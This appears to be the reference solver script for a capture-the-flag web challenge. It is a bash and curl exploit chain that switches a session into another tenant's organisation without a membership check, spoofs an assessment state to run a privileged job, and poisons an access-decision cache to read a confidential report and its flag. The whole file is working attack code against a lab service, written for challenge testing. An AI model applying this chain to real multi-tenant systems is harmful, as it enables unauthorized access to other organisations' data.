#!/usr/bin/env bash
#
# Reference solver for THE LEDGER — cURL only, exactly as a player would do it.
#
#   ./solve.sh [BASE_URL]
#
set -euo pipefail

BASE="${1:-http://localhost:8000}"
EMAIL="alice@helios.example"
PASS="alice-helios-2026"

say() { printf '\n\033[1;34m== %s\033[0m\n' "$1"; }

# Wait for the service.
for _ in $(seq 1 30); do
  if curl -sf "$BASE/api/v1/health" >/dev/null 2>&1; then break; fi
  sleep 1
done

say "Act I - authenticate as an analyst of the other tenant's counterpart"
LOGIN=$(curl -s "$BASE/api/v1/auth" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}")
TOKEN=$(printf '%s' "$LOGIN" | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
AUTH="Authorization: Bearer $TOKEN"
echo "token: ${TOKEN:0:16}..."

say "Act I - point the session at the target organisation (no membership check)"
curl -s "$BASE/api/v1/sessions/switch" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"organization_id":"org_vantage"}' | python3 -m json.tool

say "Act I - the projects endpoint still scopes to the membership..."
curl -s "$BASE/api/v1/projects" -H "$AUTH" | python3 -c '
import sys, json
print("projects organization:", json.load(sys.stdin)["organization_id"])
'

say "...but the assessments endpoint follows the active org and leaks the target"
ASSESSMENTS=$(curl -s "$BASE/api/v1/assessments" -H "$AUTH")
printf '%s' "$ASSESSMENTS" | python3 -c '
import sys, json
for a in json.load(sys.stdin)["assessments"]:
    print("  %-16s state=%-10s report_id=%s" % (a["id"], a["state"], a["report_id"]))
'
REPORT_ID=$(printf '%s' "$ASSESSMENTS" | python3 -c '
import sys, json
for a in json.load(sys.stdin)["assessments"]:
    if a["id"] == "asm_conf":
        print(a["report_id"])
')
echo "target report: $REPORT_ID"

say "Baseline - the report is denied before the chain"
curl -s -o /dev/null -w 'GET %{url_effective} -> %{http_code}\n' \
  "$BASE/api/v1/reports/$REPORT_ID" -H "$AUTH"

say "Act II - run generate on a READY assessment by asserting APPROVED"
curl -s "$BASE/api/v1/jobs" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"assessment_id":"asm_conf","action":"generate","reported_state":"APPROVED"}' | python3 -c '
import sys, json
j = json.load(sys.stdin)["job"]
print("job %s: evaluated=%s actual=%s" % (j["id"], j["reported_state"], j["actual_state"]))
'

say "Act III + IV - read the draft to seed the access-decision cache"
curl -s "$BASE/api/v1/reports/$REPORT_ID" -H "$AUTH" | python3 -c '
import sys, json
d = json.load(sys.stdin)["report"]
print("owner:", d["owner_user_id"], "state:", d["state"], "access:", d["access"])
'

say "Act IV - finalize: ownership reverts to the real owner, state -> READY"
curl -s "$BASE/api/v1/jobs" -H "$AUTH" \
  -H 'Content-Type: application/json' \
  -d '{"assessment_id":"asm_conf","action":"finalize"}' | python3 -c '
import sys, json
print("finalize job:", json.load(sys.stdin)["job"]["id"])
'

say "Final - the cached ALLOW returns the READY body"
BODY=$(curl -s "$BASE/api/v1/reports/$REPORT_ID" -H "$AUTH")
printf '%s' "$BODY" | python3 -c '
import sys, json
d = json.load(sys.stdin)["report"]
print("owner now:", d["owner_user_id"], "state:", d["state"], "access:", d["access"])
'

FLAG=$(printf '%s' "$BODY" | grep -oE 'GCDxGLORY\{[^}]+\}' | head -1 || true)
if [ -n "$FLAG" ]; then
  printf '\n\033[1;32mFLAG: %s\033[0m\n' "$FLAG"
else
  printf '\n\033[1;31mflag not found\033[0m\n'
  exit 1
fi
